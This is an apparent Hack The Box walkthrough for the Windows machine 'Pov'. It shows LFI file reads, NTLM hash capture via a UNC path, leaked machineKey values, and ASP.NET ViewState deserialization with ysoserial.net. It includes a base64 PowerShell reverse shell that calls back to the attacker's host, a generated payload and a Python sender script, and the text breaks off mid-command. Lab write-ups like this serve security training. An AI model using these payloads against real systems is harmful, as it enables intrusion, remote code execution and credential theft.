---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - SeDebugPrivilege
  - Insecure-Deserialization
  - Process-Migration
---
# Overview

| Name        | Pov         |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
nmap -sV -Pn -sC --min-rate=5000 -T4 10.129.230.183
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 12:09 CDT
Nmap scan report for 10.129.230.183
Host is up (0.14s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

![[pov.png]]
# Enumeration
## Fuzzing

```bash
$ ffuf -H "Host: FUZZ.pov.htb" -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 12330

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 151ms]
```

![[pov2.png]]

`http://dev.pov.htb/portfolio/` is vulnerable to **LFI** via the file parameter.

Click in Download CV and we see this request:
## LFI

```bash
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dev.pov.htb/portfolio/
Content-Type: application/x-www-form-urlencoded
Content-Length: 363
Origin: http://dev.pov.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=aNgpO925QQ%2Fv%2BO1EyF2pCUhsgJ1FU%2FmqnUVpCUbXXTC%2FGwXMAkiZssApu9NV7Nc4OF9WDEjAieTV1JdrYFV0jsWTwLg%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=7cC4ZCMZStDfjI3kv0k7Yu9NDGEjn4sD3eYkI4rIgh%2FTc9PtHvMSkOYRYPr0tB%2FZhY60%2Futa8odY0Y2zMKlxpLaMWvBcYfOEoPP1bKHzoZhb5iFsbhgAhfk%2Buzg9k8yFy5IGaA%3D%3D&file=cv.pdf
```

Modify it to:

```bash
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dev.pov.htb/portfolio/
Content-Type: application/x-www-form-urlencoded
Content-Length: 376
Origin: http://dev.pov.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=aNgpO925QQ%2Fv%2BO1EyF2pCUhsgJ1FU%2FmqnUVpCUbXXTC%2FGwXMAkiZssApu9NV7Nc4OF9WDEjAieTV1JdrYFV0jsWTwLg%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=7cC4ZCMZStDfjI3kv0k7Yu9NDGEjn4sD3eYkI4rIgh%2FTc9PtHvMSkOYRYPr0tB%2FZhY60%2Futa8odY0Y2zMKlxpLaMWvBcYfOEoPP1bKHzoZhb5iFsbhgAhfk%2Buzg9k8yFy5IGaA%3D%3D&file=\\10.10.14.122\test
```

And send you will see `302` and in responder:

```bash
$  sudo responder -I tun0

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.230.183
[SMB] NTLMv2-SSP Username : POV\sfitz
[SMB] NTLMv2-SSP Hash     : sfitz::POV:f3029af84a1397c5:F1A8A63BD23B46AF5F8F520114487ECC:010100000000000000DDFCD3043DDC010DF7BFD41E25ADFE00000000020008004E0049005200540001001E00570049004E002D0054003000310034005A0059004D0034004B005700540004003400570049004E002D0054003000310034005A0059004D0034004B00570054002E004E004900520054002E004C004F00430041004C00030014004E004900520054002E004C004F00430041004C00050014004E004900520054002E004C004F00430041004C000700080000DDFCD3043DDC0106000400020000000800300030000000000000000000000000200000FE9B961E74F04A322D9E61955E02225DFB846CC5299D3418D32764BF365D59B50A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320032000000000000000000
```

Hash is not crackable though. Since its a `.net` site we can try `web.config`:

```bash
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dev.pov.htb/portfolio/
Content-Type: application/x-www-form-urlencoded
Content-Length: 368
Origin: http://dev.pov.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=aNgpO925QQ%2Fv%2BO1EyF2pCUhsgJ1FU%2FmqnUVpCUbXXTC%2FGwXMAkiZssApu9NV7Nc4OF9WDEjAieTV1JdrYFV0jsWTwLg%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=7cC4ZCMZStDfjI3kv0k7Yu9NDGEjn4sD3eYkI4rIgh%2FTc9PtHvMSkOYRYPr0tB%2FZhY60%2Futa8odY0Y2zMKlxpLaMWvBcYfOEoPP1bKHzoZhb5iFsbhgAhfk%2Buzg9k8yFy5IGaA%3D%3D&file=/web.config
```

We get:

```bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=/web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Tue, 14 Oct 2025 17:22:13 GMT
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

Hm there is `__VIEWSTATE` which seems to have Insecure Deserialization
## Insecure Deserialization in `__VIEWSTATE`

We can read from [here](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net).

For exploit we need:

- Validationkey
- Decryptionkey

`web.config` file has it:

```bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=/web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Tue, 14 Oct 2025 17:22:13 GMT
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

Do this in your own windows machine:

```powershell
PS C:\Temp> wget https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip -UseBasicParsing -OutFile ysoserial.zip
```

```powershell
PS C:\Temp> Expand-Archive ysoserial.zip -Force
PS C:\Temp> ls


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/13/2025  10:11 AM                Hack.rep
d-----        10/14/2025  10:40 AM                ysoserial
d-----        10/13/2025   4:39 AM                __handlers__
-a----        10/13/2025   4:32 AM        1637343 7z-installer.exe
-a----        10/13/2025   4:31 AM          17104 bininst2.zip
-a----        10/13/2025   4:51 AM              0 flag.txt
-a----        10/13/2025   9:42 AM              0 Hack.gpr
-a----        10/14/2025  10:39 AM        5306757 ysoserial.zip


PS C:\Temp> cd .\ysoserial\
PS C:\Temp\ysoserial> ls


    Directory: C:\Temp\ysoserial


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/14/2025  10:40 AM                Release


PS C:\Temp\ysoserial> cd .\Release\
PS C:\Temp\ysoserial\Release> ls


    Directory: C:\Temp\ysoserial\Release


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/14/2025  10:40 AM                dlls
-a----         10/7/2020   1:48 PM           3072 E.dll
-a----         10/7/2020   1:48 PM          45056 fastjson.dll
-a----         10/7/2020   1:48 PM        1398456 FSharp.Core.dll
-a----         10/7/2020   1:48 PM         608654 FSharp.Core.xml
-a----         10/7/2020   1:48 PM           8704 FsPickler.CSharp.dll
-a----         10/7/2020   1:48 PM          34304 FsPickler.CSharp.pdb
-a----         10/7/2020   1:48 PM          14391 FsPickler.CSharp.xml
-a----         10/7/2020   1:48 PM         969728 FsPickler.dll
-a----         10/7/2020   1:48 PM          69632 FsPickler.Json.dll
-a----         10/7/2020   1:48 PM         101888 FsPickler.Json.pdb
-a----         10/7/2020   1:48 PM           6130 FsPickler.Json.xml
-a----         10/7/2020   1:48 PM        1101312 FsPickler.pdb
-a----         10/7/2020   1:48 PM         132359 FsPickler.xml
-a----         10/7/2020   1:48 PM        1113856 microsoft.identitymodel.dll
-a----         10/7/2020   1:48 PM        1363456 Microsoft.PowerShell.Editor.dll
-a----         10/7/2020   1:48 PM          22016 NDesk.Options.dll
-a----         10/7/2020   1:48 PM         700336 Newtonsoft.Json.dll
-a----         10/7/2020   1:48 PM         707721 Newtonsoft.Json.xml
-a----         10/7/2020   1:48 PM         249856 Polenter.SharpSerializer.dll
-a----         10/7/2020   1:48 PM         122672 Polenter.SharpSerializer.xml
-a----         10/7/2020   1:48 PM           4608 TestConsoleApp_YSONET.exe
-a----         10/7/2020   1:48 PM            157 TestConsoleApp_YSONET.exe.config
-a----         10/7/2020   1:48 PM          13824 TestConsoleApp_YSONET.pdb
-a----         10/7/2020   1:48 PM         203264 YamlDotNet.dll
-a----         10/7/2020   1:48 PM         247486 YamlDotNet.xml
-a----         10/7/2020   1:48 PM         416768 ysoserial.exe
-a----         10/7/2020   1:48 PM            918 ysoserial.exe.config
-a----         10/7/2020   1:48 PM         572928 ysoserial.pdb
```

Make reverse shell from [here](https://www.revshells.com/).

```powershell
PS C:\Temp\ysoserial\Release> .\ysoserial.exe -p ViewState -g TypeConfuseDelegate --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" --approach="/" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADIAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
nw0rZrOxONGPneWjuReg3NDHVpgA1W8GnwmpY3z/4bpgXCkiiPIBbBIf0aV6HRhb3DtK+5DgW5mvr1/DRk/33QilTRN4FAthQ2uXZ7GUS/+gyF+C6F70v8GGrN1g7CynNhVHIBTeahY6czNsL8+T6BDUUyv5a2pq/NlXg7/vMa0CjNYHbq6GweReymymK6tCRgP3lOo24uTAVNX7NaOmqunwz65wg45FAK3qsCbuKdjWvAp7KHtwB0kWsqP+m18XzI1Q6zuq8sJV161R1ufMH7KM8NOHAbv1ONT/M2KsxxmWMcHhr5DWo7PUQVsRM+nHTD5/RQYdjCfoFYW6YcqwFDt9oZYWzVTO2ml6cY8P/d3N9yydjjdkNXOxrwbP7bTGxsEXC8I84foYuJ+zg+SwiwEr1G4qlWycXXcF6BWd7Q0RngZBiW8WH7cbqBpPI1jGnc4q2AHO/iWrFxlAjDz0ZHpVVfydgnuTKEfyoEsnKNfwSWNFTdQFy6UYXL15MvKPdNtqvBU/xY/TnUzCtwm4HCHUbE0khPHdJZ/UD7GCR8OHeJhB30W8qLH5NTYrAsnsCNKeAypobCOjpgcCeKsTLxTZFVPEtl8dHb2dSPxIXUwI9z3mmAkxNmIY1hHXHU40KD/SAfQWchsEQ0We8273jAyXHbJ8N9Zv56esF0r3XGuB62noq6Y+rvGINLTu76ufV6rWK4xfcM525aJJLwwHGymc14fKUrpAEvISx+olgb5cJPAGI4wB15jmaqqZlaFgDuH8b1D6DFEYt6oKbZmNJ2QCii1Le4PgHPg/QcMEL0qpiH8xxKV1RIu9iAgZZ68yg3Z4aRV5fseuOLNvJjZRUzxoAReb7PcZGGsgFy/9lFCzO8NRpybSrreMKxj3hIFlumFdHO2IaX2djWyGdzoNaqfVA3H3MpXCrJZ9kQrLG18goSoN1ZbcAJwH+Vv1DzMHIEkHhhl1rwPtVrixXK2r6vXbu31KisbRcT+WNS/MRQbPhHCclFc64gxzoeyxP76a5oBMbQGuwGiZvwUq89AhxuUfb+PRT3KF4uyPvfolU3O4rpR4xtL0ricb7PF3f9d2CZzgTSR+enFRMoFTEAJrxL47cRw7HaaGHn1VBpSR6PnDnwrPYPh639NgSIOIHAXWfpxmuQ9eldskO31pHwS305S6x3QA7q4fAW0imEiNJQlzExUpcy2JCsnEvEa6eSNI3eglMMEfy8AMICT3qa/jtuUTnJ/yxby48dodNU8vYSZ1RiFkg9fEVoGUeSwwFOc7LD4O4FK9CREgsMiQIpQT8jNYM+weREgkBqwlfq06V+N6bJiH/VkgjotSuXSPXmAjtrtdcV738aMn1fy6bl2sjIeQkc8jiVwtjn/TEyaWhTzScBrfRkQKvDDRUat70ybEYHa9ca331ELi/XL6eUs1/e3I05SqvlUCvRMFR9dzBv1qekOfmtJeUgPbLkPbtP86PfE9849J2foK8yPGcwOStdc8dGGn43dYEy4ZhWQCAjuwl8bQZy7igLNiQ2rmqVimiLlBoLE8uKGeRFbebJqX1g2vgl8f475LE6aUT2VjHwI3sVdh/NHLvvbYYfEIW+pwzVMw92DHaJFeLGs/xFarKxV6ilfnPu86X+GfRcTd3wqJiRuA89kyR+ld4h1j5Afbp8yKntsnKNbyGACYnNXb6AR+mVk7EHDyu4dEfypFWphzqTUCv+C1qPeZGFi9VEl9UMTUCF+CC7MTSdLPRVJHqMCri8gHXJgKbuK5DC4MRGv3C7s5xzdN6Baf9900Fn6ejdYV2/mNw3+Msd6Runj6Y0NK/EH+ilsCfsGr6LPts4BF+kqL7voUD7NeKQvhmlaAX6SgImH0QRUaANXniE2jEGbJ1udhzzNrfh8V8Z8lW57+LeXW5kxeolJoHXBzj5bmtLoL0MNAI/3KLhXMPpywpSa4bTaEx92q41eB8iCxIZU2HkOVwFaE8e9iVLkyIvmrWcRDmo2gA8sUwhQNYwpzGAJ7bOvvohQlUJpDJJ9jS1eCd9eUx8nmQjHlUUj7BKhezCPgS3hTTZBEA0WAHsgBVn8YjQxxnRC7YTzWCIGYyvhsrSAawF7VAgra8fVoZhYsFMTrjQ8Bm79rJ7YktHJ/W/t4GCUxigrpCclOJ760peXoeN/ZBlZRrfU68l4lF3qXt6fkeJ2aX58DRhlidEacL1uaYKp6mw+X+7GQ4YxGkHq1PLlu3nwFboJlEMYbtN6i+nHRyq3cAGo0xtFtmUOiDoYn6ZfxQzIzj/Ws1bBg72PqkrQU6aNE9doqBLFPcsgMgVNCjLuqSOSPcBkguHR0/3sa7xmHp7U4tdwbzv2tB9bNBv8Icbrk/B1R5fy8evi2iCxotddwPekQXKScGUK2VtxOhYArqyCZ59fBB6WU0+15wyCRcfdk1tacRlvsBR6QT6Kp+3LR+ComBjSDOh0fwYMrkx2+Awv/QHPpbXL25MjAF4V3RuNvvwLNfg5E4KzB9w/F/REQTUa7D1vIkzOKWkh4Pz7ZN0+MD8aZoQMrcwZ+BDzeno6squru/NlSdYn1eAS/aHI8BDjGu3XppYIDCijpP47Xb7ffWiDbg5DY9aBfmiLakQSGgJTw60bW4+0bBZPblEwkumVH30Mbg4LOnR5/pu5qlW4Un9JArFkBOxdN/M8YMV93igKaSehYsNg40fASq66EbgIsIBmSGId/2qP+ELnDzjsHlwR2Sji4SIH6EtLdvjVer0Fdc4o4RpvIMng3zhBCyTuaCvRuRPifW4fQbHA4bFnJiCwMVrVVzbiQsls0Fso0fIz4IlmLQiKhX514kdO3A0yn2aPiQHTo9qfNj6gDZQeJaRoCAMShreCm/lUU0XSCcdPJmcuWLHmp1AC6QaZpNTwqbOSxEQ1ikzYmCvfPe1Y/SxQ3z8fc9R0Bu9T8KFmxFUnQhHV1P28+qKDr2MPXsShDEF/iHQtiCcQvhBA4cAGCL3uNxif14S5iO4c0jx1rSq4QZPZv8UzxtadAr6Wo7RD8IiIMPARGLaCNpfGkD5UpTbhy0JS7wXZlXSsv1Rfam8kiYbCSSzBRrscA7PfMheB4x5juMygfhh1lS1j/idREbq3Ukv+dV+Jn/BlFhaNaTMR6HaDg4cchVZsig+JL6thwC0/ClwTvyaqjyV9exhUX0OSc2Am0bJ+g14/enD69fWVnshLjx5bLgoz62NrgrOWWz2psCuRtxms2LuauHSJqEkQoK1FzQe0heH025g7iAj9JI4Aefl5qQ4i+bY7rs2j6zKX7kT7U+169MGU0f3g/sYask1F+FwUZfezcTA+FEr52tennFLCxl7PoS8UhqCGpLOPUE8EmSw3TuPoW8Y0ncYgqfHU4l0wpPQOxJnTm3fDF6/KU6lPYL9C2CB6zlyiOUTFg59yvrpYqKch56MYOhBKa3pjco9G1CQEZxXlV/D22SKFkIwt3bnUzEJS3rodKFUZetU6ei7FrtzXt+18EygBz/4UFLKL+USuUWFeNHYguMA0PPnno8wrWz5oPHGNqKzUwZGCxdWXFlb6vyfhJXnq2+rapH86jjiSm0P9ZUF7IVzX6n5IjSFPaInOjVpSjnlSV1+Vz3wCP4Ddkx5XDBZrufst3OvAyh7+dR397WSqZu/KRBvASsoADqvMaX3xzIrrI+N2TUFrMrY7+kkNBDChVvlanK9FN0kWvGVb0vHx/PNU0jTh9NSKtmmLWqIa/HSyvfteFbguO20uMj8wWj8kdxjlXc9LAa1VbVwdw9+F5wt7HFlB/s6VcU6CCdwok72wQs1KulcBCuZl0/0YGhgZgD7frVOIkM99I1LA/raVNf1sUsOmiqFAo+AsQs0jMTyrzogGRO0bdg073QGVlw6wnn2Xu86WtCt7Amfs+zCKLOO8U24L7HSYKiohpCCzo/QmXvDeb0jQwOCrQ/2xt/bQr2DAa2fbKCBNry/QKlzIdqiFmePSaosqc+BDie0YL+h1yyxpxuUwZmzueEggYPUUPwFosaHWQvPYbcR7tqwQl2c7kNYVC76tAVOmERhE3iclZy8qVnMOlv3p+thY2DO/J12SsgM5PMY3W4R1Gi2B990xlz5at8nuRlEYpm/U88vDdXU3dzZ2zOsKgzkYUbgQ0Y+PakPe4hjk2fDAN42s85Tq4wdzQD6SmMkIPc4VQiXl2jGLltm2LgY5iTsg/HupHc5Os8zB4bTPljwoD+XNMOl/XKhYN8/l/MxwoQxqyYKoFw7vcMWDYjoPGDZVYNAUMV2YJW4owqktVGfF0zz9zsGKb8RtWKkdJhvK+lmF6q54Ps0qSeCZxHJgyKKUoxHqt/FqsgPmSaOWovXN+IJJbLc/x5bh2uiZHoa/Ykxxs5FYFyq4i4JaQAz7F5mS68HULBFUsY2d+Wp/+TTKeEDycdn/mxkuicjy0XYC8URvefqFpXoLJ/8/KjGj2jmmuQh+FWbX+puAZj0CnDmCkDt7EDj831nVm6XUo0livH0SFCUCW31zTRmaRf+JgR0s+DJkMJyUouI5iRpvnJnEIlpRTY7z3WAtJednGlQtPXchMjnvMpxlQih8I2F6SRfsun/6TS1PNa6dNGypepVg6n/AfH5pItMSgs22ndoQgxFL5LhWDMTlhN1RbzjFg5pmtrwpRULSD3jn87Gv4Dn5ALw3ww6RHoOulxwx0cBDq2dQMNrcfTB/r/GuDBTSRs7TVh+dPFj4XdnLLenZSt1YMgwthAwfJ2kjjOqYNA9fYa8jdq5zAS27VDXxPKHfFqJWUwkdZsk669fg5GnL1CDRFNO4JbBpp3puHzH+orcMGGoenwxZG6RenKBaVjBUevhYKN6sOP4jHRwr0QzO1
```

Now, we have 2 options:

1. Use `Burpsuite`, intercept the request sent to the server when clicking `Download CV` and pass the payload to the variable `__VIEWSTATE` (as explained in [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter))
2. Make a simple script in `Python` which sends all this data and requests, but via console; so that if we lose the connection - for whatever reason - we can easily reconnect to the machine.

I choose the second option, where I create a simple script `Python`:

```python
import requests
import argparse
import sys
import urllib.parse


def parse_arguments()->argparse.Namespace:
    parser = argparse.ArgumentParser(description="A simple argument parser example.")
    # Add arguments
    parser.add_argument('-u', '--url', type=str, help="Url to make POST request to. Example: http://dev.example.htb/example/", required=True)
    parser.add_argument('-c', '--command', type=str, help='ViewState command', required=True)

    return parser.parse_args()


def make_POST_request(url: str, command: str)->None:
    generic_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1"}
    payload = {"__EVENTTARGET": "download", 
                  "__EVENTARGUMENT": '', 
                  "__VIEWSTATE": urllib.parse.unquote(command), 
                  "__VIEWSTATEGENERATOR": "8E0F0FA3", 
                  "__EVENTVALIDATION": "pGfjsostEYtFuRQ+WLNYLVAVMkGFgPjb4CDyPOQ+k20Bf6VSQiuoaYE7iH2XNLMQRiPHNeCRYzI/Gxbh1N4NVUaITnLyalHjhxMVG+ZsotApeeHvWBirBzUW5IHovXP985Kdnw==", 
                  "file": "cv.pdf"}
    r = requests.post(url, headers=generic_headers, data=payload, verify=False)
    if r.status_code != 200:
        print(f"[!] Could not execute the payload. Code status {r.status_code!r}")
        sys.exit(1)
    print("[*] Payload succesfully executed.")
    return


def main()->None:
    # Get user arguments
    args = parse_arguments()
    # Make the malicious request
    make_POST_request(args.url, args.command)


if __name__ == "__main__":
    main()
```

Finally I run:


```powershell
$ python3 main.py -u 'http://dev.pov.htb/portfolio/' -c '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